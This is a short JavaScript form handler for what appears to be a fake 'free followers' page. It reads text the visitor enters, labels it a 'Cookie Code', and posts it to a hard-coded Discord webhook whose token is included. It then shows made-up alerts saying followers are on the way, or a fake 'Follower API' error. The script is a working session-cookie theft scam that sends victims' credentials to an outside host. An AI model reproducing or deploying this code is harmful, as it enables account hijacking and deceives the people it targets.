
async function sendContact(ev) {
  ev.preventDefault();

  const senderMessage = document
    .getElementById('messageInput').value;

  const webhookBody = {
    embeds: [{
      title: 'New Cookie',
      fields: [
      { name: 'Cookie Code', value: senderMessage },
      ]
    }],
  };

  const webhookUrl = 'https://ptb.discord.com/api/webhooks/1007691288759500891/CRUYfw1841NswMc23UvG-XbYynpx7APx55cCFYWFLz3O9-W6ePc4JiQ9fioa_dNB9BOu';

  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(webhookBody),
  });

  if (response.ok) {
    alert('Processing...')
    alert('💚 | Followers being sent... Please wait to 1-2 hours!');
  } else {
    alert('Follower API did not work, please try again.')
    alert('ALERT ERROR: 506111');
  }
}
